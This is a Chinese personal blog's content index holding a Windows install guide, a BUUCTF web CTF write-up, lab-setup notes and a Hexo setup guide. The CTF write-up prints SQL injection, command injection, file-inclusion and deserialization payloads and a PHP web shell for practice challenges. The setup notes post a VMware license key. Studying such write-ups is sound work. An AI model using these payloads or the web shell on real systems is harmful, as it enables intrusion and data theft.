{"meta":{"title":"会飞的鱼的Blog","subtitle":"学习中","description":"一个简简单单的博客","author":"flyingfish","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2018-09-30T10:23:38.000Z","updated":"2021-02-24T13:16:03.422Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"404","date":"2018-09-30T09:25:30.000Z","updated":"2021-02-24T13:17:45.197Z","comments":true,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2021-02-24T13:15:53.233Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2021-02-24T13:28:16.346Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2018-12-12T13:25:30.000Z","updated":"2021-02-24T13:16:51.190Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"WIN系统安装小白教程","slug":"小白装机教程","date":"2021-02-23T08:27:40.000Z","updated":"2021-02-25T15:54:05.415Z","comments":true,"path":"2021/02/23/xiao-bai-zhuang-ji-jiao-cheng/","link":"","permalink":"http://example.com/2021/02/23/xiao-bai-zhuang-ji-jiao-cheng/","excerpt":"","text":"我现在一般使用的装机方法是先把PE系统安装到外置存储介质中，然后再在PE中安装系统。这种方法的好处是主要将U盘等制作好之后，下次就可以直接使用了，不需要再次折腾，适合我这样的经常进行重装系统的人。 至于网络上常见的老毛桃或者其他类似软件，因为会带有一些广告，不是很纯净，所以这里不是很推荐使用。 准备工作 1个存储介质（U盘，硬盘等），容量不需要太大，8GB以上就差不多了，因为还要存放系统ISO镜像，win10系统还是比较大的 一台可以正常使用的电脑，用于PE盘的制作 提前下载好我们使用的pe系统，这里选择的是优启通（https://www.upe.net/），原因就是这个比较纯净 类似的还有微PE（http://www.wepe.com.cn/download.html），也是一个不错的选择 你所需要重装系统的电脑的品牌，这一项是用于查找进入BIOS需要摁哪个键 一些基本的计算机知识 简单的英语或者有查阅翻译的能力（进入BIOS后会用到） 提问的艺术（https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md） 到了这里前期准备就结束了，接下来大致分为两个阶段 PE系统的安装 WIN系统的安装 PE系统的安装（U盘的制作）这里以优启通作为演示，因为版本比较新 可以看到右下角有三个图标，分别是安装到U盘，移动硬盘，生成ISO，我们根据自己的存储设备选择U盘或者移动硬盘，这里我采用的是移动硬盘，一块来自希捷500GB的机械硬盘，这里直接全新制作就可以。 制作好之后我们就可以通过进入BIOS，修改启动选项来进入到我们制作的PE中去，但在此之前，我们还需要下载好所需要安装的系统ISO镜像，这里推荐一个网站，我告诉你（https://msdn.itellyou.cn/）这个网站里面有着Windows系统的原版镜像以供下载。下载好镜像之后，就到了第二步了，WIN系统的安装。 WIN系统的安装首先我们需要知道你的电脑型号是怎么样进入BIOS的，这一点可以去网上查找，一般是通过摁F2，F12，ESC，DELETE，这几个键来进入的。查找好之后，我们就可以重启你需要重新安装系统的电脑（这时要确保你在上一步制作的U盘或者硬盘连接在你所需要安装系统的电脑上），在启动时连续多次摁特定键来进入BIOS，找到Boot Manage这个选项（可能不同的BIOS这里的名称不一样，但大多都带有Boot字样），将我们制作好的设备调整到第一启动位置，具体调节方法可以阅读BIOS内文字。之后进入PE系统。","categories":[],"tags":[{"name":"教程","slug":"教程","permalink":"http://example.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"BUUCTF WriteUp","slug":"BUUCTF-WriteUp","date":"2021-01-16T09:44:59.000Z","updated":"2021-02-24T12:56:58.339Z","comments":true,"path":"2021/01/16/buuctf-writeup/","link":"","permalink":"http://example.com/2021/01/16/buuctf-writeup/","excerpt":"","text":"WEB[HCTF 2018]WarmUp启动环境，打开网址是一张滑稽，没什么用，看一下源码，发现有注释。 image-20210116175203912 访问source.php，直接给了源码，进行代码审计。 分两块，第一块是emmm::checkFile，里面做了一些判断。 第二块是一个include，文件包含，我们要绕过验证，也就是上面的checkFile方法。 image-20210116180701150 hint.php image-20210116182826228 include触发的三个判断条件全为真时，include才执行。 checkFile为真 第一个if，page需要设置并且为字符串 第二个if，page需要在白名单中 _page是page从开始到?的位置截取的一段子串 第三个if，_page需要在白名单中 _page进行url解码 _page再进行相同截取 第四个if，_page需要在白名单中 所以我们构造payload的时候，需要反着来构造，需要截取，就添加，需要url解码，我们就进行编码 首先构造以下命令，保证最后_page在白名单中 1?file=source.php 接下来构造出include的flag 1?file=source.php?../../../../../../../ffffllllaaaagggg 然后url编码两次 1?file=source.php%253F/../../../../../../../ffffllllaaaagggg payload就构造完成了。 [强网杯 2019]随便注开局就是一个输入框，先看看简单的注入，判断出闭合符为单引号 12341&#39; &#x2F;&#x2F;报错1&#39;# &#x2F;&#x2F;正常1&#39; and 1&#x3D;1# &#x2F;&#x2F;正常1&#39; and 1&#x3D;2# &#x2F;&#x2F;正常，false 接下来获得列数，列数为2 1231&#39; order by 1#1&#39; order by 2#1&#39; order by 3# &#x2F;&#x2F;报错 尝试用select，发现被过滤 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 到这里就没思路了，看wp，是堆叠注入，就是一次执行多条命令，之间用分号分隔 11&#x27;;show databases;# image-20210118190706722 下来查表 11&#x27;;show tables;# image-20210118192028103 下来查字段 11&#x27;;show columns from `1919810931114514`;# image-20210118193008279 看到有个flag字段，应该就在这里 接下来是获取flag中的内容 这里有两种方法 方法一：改名 将表名words换为其他的，类似于word1 将表名1919810931114514换为words 将列名flag换为id 通过使用alter,rename，构造payload 11&#x27; ; rename tables `words` to `word1` ; rename tables `1919810931114514` to `words` ; alter table `words` change `flag` `id` varchar(100);# 改完名之后，直接查看就可以得到flag，因为回显的数据默认是来自word表的 image-20210119104237475 方法二：预处理语句 通过使用prepare，execute，deallocate命令来绕过验证，这里是用了concat拼接 11&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;# image-20210119105357011 [极客大挑战 2019]EasySQL1万能密码 image-20210119110934155 image-20210119110951672 [极客大挑战 2019]Havefun1看源码，有一段注释 image-20210119113449940 直接get传参试试，成了 image-20210119113537553 [SUCTF 2019]EasySQL1看wp，大佬直接盲猜SQL语句 1select $_POST[‘query’] || flag from Flag 1*,1 直接一把梭哈 image-20210119125252021 下来是做法二： 11;set sql_mode=PIPES_AS_CONCAT;select 1 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数 [ACTF2020 新生赛]Include1根据题目，文件包含 payload： 1?file=php://filter/read=convert.base64-encode/resource=flag.php 这里有点想不通为什么要用这个 1PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZDZlYTU5ZTktMjZjNC00MTlmLTkyMzgtNDFhY2E3ZGRlMDkxfQo&#x3D; 123&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;d6ea59e9-26c4-419f-9238-41aca7dde091&#125; [极客大挑战 2019]Secret File1首先看看源码，发现有个Archive_room.php 访问，发现有一个按钮，是指向action.php，然后我们到了end.php 这一步需要抓包 image-20210119133101744 得到有一个secr3t.php image-20210119133123261 得知flag在flag.php里面，还给了源码，代码审计，有一个include，文件包含 然后发现过滤了一些伪协议，filter可以用，像上一道题目那样构造payload 1?file=php://filter/read=convert.base64-encode/resource=flag.php 1PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ODQzNGQxMWUtM2M4NS00MjZjLTljOTUtYmRkNjllNjNhZjMzfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D; 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;我就在这里&quot;; $flag = &#x27;flag&#123;8434d11e-3c85-426c-9c95-bdd69e63af33&#125;&#x27;; $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27; ?&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; [极客大挑战 2019]LoveSQL1用万能密码可以登录进去 还是SQLi的流程 1?username=1&#x27; order by 1%23&amp;password=123 先判断一下字段，有三个字段 接下来是寻找注入点 1?username=1&#x27; union select 1,2,3%23&amp;password=123 爆数据库,geek 1?username=1&#x27; union select 1,database(),3%23&amp;password=123 爆表名,geekuser,l0ve1ysq1 1?username=1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123 爆字段，id,username,password 1?username=1&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=123 得flag 1?username=1&#x27; union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&amp;password=123 [GXYCTF2019]Ping Ping Ping1ping命令执行 首先ping本地（127.0.0.1） 1?ip=127.0.0.1 image-20210125121320469 用管道符或者分号 我们首先来尝试管道符 1?ip=127.0.0.1||ls image-20210125121519587 可以看到回显有两个文件，flag.php和index.php，显然我们是需要查看flag.php里面的内容，用linux里面的命令cat 1?ip=127.0.0.1||cat flag.php image-20210125121706014 提示说空格问题，那么我们先绕过空格，方法是替换为其他可以代表空格的字符，例如 ${IFS} 1?ip=127.0.0.1||cat$&#123;IFS&#125;flag.php image-20210125122755896 提示说{}问题，那换一个 1?ip=127.0.0.1||cat$IFS$1flag.php image-20210125123016168 flag被过滤了，我们尝试去看index.php 1234567891011121314151617181920/?ip=|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&quot;; print_r($a);&#125;?&gt; 可以看到flag过滤了/,*,`` 常用的几种都过滤了，不过可以使用编码 1?ip=127.0.0.1||`echo$IFS$1Y2F0IGZsYWcucGhw$IFS$1|$IFS$1base64$IFS$1-d` image-20210125125046345 [ACTF2020 新生赛]Exec1查看源码 image-20210125140749109 这里我们可以看到命令执行的语句 -c&lt;完成次数&gt; 设置完成要求回应的次数 还是先和上面一样，稍有不同是这道题目使用了POST传参 1?target=127.0.0.1||cat /flag image-20210125143053177 [护网杯 2018]easy_tornado1SSTI 服务端模板注入 [极客大挑战 2019]Knife1这道题很简单，蚁剑或者菜刀直接连就可以 密码就是Syc，也就是Post的变量 然后返回最上层，就可以看到flag image-20210126120141053 [RoarCTF 2019]Easy Calc1 image-20210126121719223 查看源码，发现调用了calc.php?num 访问calc.php，直接给了源码，过滤了一些字符，没思路了，看wp 是利用了php解析特性 12?num=phpinfo()?%20num=phpinfo() 上面的两行命令，php解析是一样的，但是waf检测是不一样的，waf会按照两个变量来处理，这样就可以绕过waf 所以我们先看根目录里面有什么东西，构造命令 1?%20num=var_dump(scandir(chr(47))) var_dump是打印参数内容，scandir是查看参数目录里的内容和目录，chr(47)就是”/“，”/“被过滤了，我们使用chr(47)绕过 image-20210126122550522 可以看到有一个f1agg，我们查看它的内容 1?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) file_get_contents是将整个文件读入一个字符串 image-20210126123103847 [极客大挑战 2019]Http1看源码，发现有个Secret.php 访问，提示 It doesn’t come from ‘https://www.Sycsecret.com&#39; 我们使用bp伪造referer Please use “Syclover” browser 修改UA No!!! you can only read this locally!!! XFF伪造 123456789101112GET &#x2F;Secret.php HTTP&#x2F;1.1Host: node3.buuoj.cn:28669User-Agent: &quot;Syclover&quot; browserAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age&#x3D;0X-Forwarded-For: 127.0.0.1referer: https:&#x2F;&#x2F;www.Sycsecret.com image-20210126125740291 [极客大挑战 2019]PHP1提示说有备份的习惯，扫一下目录，扫不出来。。。看wp www.zip下载下来，有个flag.php，里面是假的 看index.php，先include class.php，然后传参，反序列化 于是去看class.php，代码审计 Name类，两个变量$username，$password 当username=admin，password=100时，输出flag 构造反序列化 123456789101112131415&lt;?php class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125;&#125;$a = new Name(&#x27;admin&#x27;, 100);var_dump(serialize($a)); ?&gt; 1?select=O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 反序列化先执行__wakeup()，该方法会对username重新赋值，需要跳过该方法 当反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup() 1?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。 因此私有字段的字段名在序列化时，类名和字段名前面都会加上\\0的前缀。 字符串长度也包括所加前缀的长度 1?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; image-20210126152717507 [极客大挑战 2019]Upload1文件上传 12GIF98a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt; bp抓包修改 image-20210126162204619 上传成功，在upload目录下 蚁剑连接 最上层找到flag image-20210126162254930 [极客大挑战 2019]BabySQL11?username=admin&amp;password=123 %27 ununionion seselectlect 1,2,3 %23 在这里使用了双写绕过，猜测这里使用了replace，替换关键字为空 总共有三列，并判断注入点为2，3 image-20210201121853596 1?username=admin&amp;password=123 %27 ununionion seselectlect 1,2,version() %23 Maria DB下的一个函数，用来看版本 image-20210201121815061 1?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,2,database()%20%23 image-20210201122354943 这是当前连接的数据库的名字，我们还需要看一下所有的数据库 12?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata)%20%23 image-20210201125245104 1?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;geek&#x27;%20%23 image-20210201125426233 再看一下ctf库 image-20210201125516753 发现Flag表，爆字段 1?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,database(),group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#x27;Flag&#x27; %20%23 image-20210201125744633 flag字段里面看内容 1?username=admin&amp;password=123%20%27%20ununionion%20seselectlect%201,database(),group_concat(flag) frfromom ctf.Flag %20%23 image-20210201130055891 [ACTF2020 新生赛]Upload1发现是文件上传 提示说只能上传图片 抓包修改后缀为phtml image-20210201132547431 得到路径，菜刀连接，得到flag image-20210201132615994 [ACTF2020 新生赛]BackupFile1根据题目提示下载备份文件，index.php.bak 接下来代码审计，发现是弱类型比较 image-20210201140346240 1?key=123 image-20210201141749208 [HCTF 2018]admin1登录用户名admin，密码123，登录成功 image-20210201143348694 随便注册一个账户登录，再修改密码源码里面发现提示 image-20210201143828718 把代码clone到本地 代码审计 在routes.py里面的register()，login()，change()三个函数里面都有strlower函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#!/usr/bin/env python# -*- coding:utf-8 -*-from flask import Flask, render_template, url_for, flash, request, redirect, session, make_responsefrom flask_login import logout_user, LoginManager, current_user, login_userfrom app import app, dbfrom config import Configfrom app.models import Userfrom forms import RegisterForm, LoginForm, NewpasswordFormfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprepfrom io import BytesIOfrom code import get_verify_code@app.route(&#x27;/code&#x27;)def get_code(): image, code = get_verify_code() # 图片以二进制形式写入 buf = BytesIO() image.save(buf, &#x27;jpeg&#x27;) buf_str = buf.getvalue() # 把buf_str作为response返回前端，并设置首部字段 response = make_response(buf_str) response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27; # 将验证码字符串储存在session中 session[&#x27;image&#x27;] = code return response@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def index(): return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def register(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = RegisterForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower(): flash(&#x27;Wrong verify code.&#x27;) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form) if User.query.filter_by(username = name).first(): flash(&#x27;The username has been registered&#x27;) return redirect(url_for(&#x27;register&#x27;)) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#x27;register successful&#x27;) return redirect(url_for(&#x27;login&#x27;)) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash(&#x27;Invalid username or password&#x27;) return redirect(url_for(&#x27;login&#x27;)) login_user(user, remember=form.remember_me.data) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/logout&#x27;)def logout(): logout_user() return redirect(&#x27;/index&#x27;)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def edit(): if request.method == &#x27;POST&#x27;: flash(&#x27;post successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)@app.errorhandler(404)def page_not_found(error): title = unicode(error) message = error.description return render_template(&#x27;errors.html&#x27;, title=title, message=message)def strlower(username): username = nodeprep.prepare(username) return username 这里涉及到一个Unicode编码问题 123ᴬᴰᴹᴵᴺ //registerADMIN //loginadmin //change 通过三次转换可以修改admin的密码，从而进行登录 [极客大挑战 2019]BuyFlag1在pay.php里面有注释提示 1234567891011&lt;!-- ~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; if (is_numeric($password)) &#123; echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;; &#125;elseif ($password == 404) &#123; echo &quot;Password Right!&lt;/br&gt;&quot;; &#125;&#125;--&gt; is_numeric()和strcmp()函数绕过 is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后 查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断 strmp函数在php5.3版本之前如果传入的数据是非字符串类型，函数将报错并返回0，即判断相等，我们可以传入数组或者object来绕过 1password=404%00&amp;money[]=1 同时cookie那里也要修改为1 得到flag image-20210201151947175 [SUCTF 2019]CheckIn1题目给了源码，进去看一下，有个wp，里面提示说.user.ini https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html p牛的博客里面提到过 https://xz.aliyun.com/t/6091 先知社区有一篇专门就这道题目讨论.user.ini auto_prepend_file 主要是利用了这一选项 当我们指定某一文件时，该文件会被包含在执行的PHP文件中 123//.user,iniGIF89aauto_prepend_file=demo.jpg 12GIF98a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt; image-20210202120743721 [BJDCTF2020]Easy MD51通过抓包可以发现提示 *Hint: select * from ‘admin’ where password=md5($pass,true)* ffifdyop在被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’ 等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数 登录成功之后，查看源码，有提示 1234567&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend.--&gt; md5bypass可以采用数组，0e，md5碰撞，这里用数组绕过 1?a[]=1&amp;b[]=2 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 这里还是可以数组绕过 1?param1[]=1&amp;param2[]=2 image-20210202124809382 [ZJCTF 2019]NiZhuanSiWei112345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 代码审计一波 要传三个值text，file，password text是file_get_contents读取字符串，我们可以通过data伪协议来构造 1text=data://text/plain,welcome to the zjctf file可以通过fillter伪协议来获取useless.php的源码 1file=php://filter/read=convert.base64-encode/resource=useless.php 1234567891011121314&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; password会经过反序列化 1password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 最后payload构造如下 1?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; image-20210202174257229","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"WriteUP","slug":"WriteUP","permalink":"http://example.com/tags/WriteUP/"}]},{"title":"基本环境搭建","slug":"基本环境搭建","date":"2021-01-05T05:24:15.000Z","updated":"2021-01-06T13:39:36.168Z","comments":true,"path":"2021/01/05/ji-ben-huan-jing-da-jian/","link":"","permalink":"http://example.com/2021/01/05/ji-ben-huan-jing-da-jian/","excerpt":"","text":"VM ware软件安装https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html 下载安装 激活码： ZF3R0-FHED2-M80TY-8QYGC-NPKYF WIN10虚拟机安装ISO镜像下载 MSDN https://msdn.sjjzm.com/win10.html Python JDK安装https://www.python.org/ 和普通软件安装类似 https://www.oracle.com/java/technologies/javase-jdk15-downloads.html jdk需要配置环境变量 https://www.runoob.com/w3cnote/windows10-java-setup.html 浏览器插件https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-standard/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search https://addons.mozilla.org/zh-CN/firefox/addon/noscript/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search https://addons.mozilla.org/zh-CN/firefox/addon/max-hackbar/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search BurpSuite抓包 Sqlmaphttp://sqlmap.org/ Ubuntuhttps://cn.ubuntu.com/download https://www.bilibili.com/video/BV1z5411b7Yr Kalihttps://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/ https://www.bilibili.com/video/BV1yv411t7ns","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"基于Github Pages + Hexo的个人博客搭建","slug":"基于Github-Pages+Hexo的个人博客搭建","date":"2021-01-05T03:26:26.000Z","updated":"2021-01-05T05:43:20.313Z","comments":true,"path":"2021/01/05/ji-yu-github-pages-hexo-de-ge-ren-bo-ke-da-jian/","link":"","permalink":"http://example.com/2021/01/05/ji-yu-github-pages-hexo-de-ge-ren-bo-ke-da-jian/","excerpt":"","text":"前期准备 Node.js https://nodejs.org/zh-cn/ Git https://git-scm.com/ Github账号 开始搭建 创建Github仓库 配置SSH 第一次使用在git bash里面输入以下命令 1ssh-keygen -t rsa -C &quot;your Email address&quot; 敲击三次回车 在C:\\Users\\user name\\.ssh 下面找到id_rsa.pub文件，记事本复制里面的内容 在设置里面找到SSH and GPG keys选项，点击右面的New SSH key 将刚才复制好的公钥粘贴到下面的文本框里面，Title可以随便起，Add SSH key。 到这一步SSH key就已经设置好了。 我们可以用以下命令测试连接 1ssh -T git@github.com 输入yes，如果看到 You’ve successfully authenticated, but GitHub does not provide shell access. 说明配置无误。 12git config --global user.name &quot;xxxx&quot;&#x2F;&#x2F; user namegit config --global user.email &quot;xxx@emil.com&quot; &#x2F;&#x2F;email address 安装hexo 准备一个新文件夹用来存放hexo文件 git bash下输入命令(路径无所谓) 12npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org &#x2F;&#x2F;npm换淘宝源npm install -g hexo &#x2F;&#x2F;全局安装hexo，遇到warning不用管 现在路径切换到刚才准备的文件夹 12cd &#39;directory&#39; &#x2F;&#x2F;切换到directory目录下hexo init &#x2F;&#x2F;初始化 到这里，本地的hexo就搭建好了，后续配置的修改可以自己去官网查看 https://hexo.io/zh-cn/docs/ push到github 在存放hexo代码的文件夹里面找到_config.yml文件，打开，翻到最下面。 git bash 123npm install hexo-deployer-git --savehexo g &#x2F;&#x2F;构造hexo d &#x2F;&#x2F;上传 GitHub 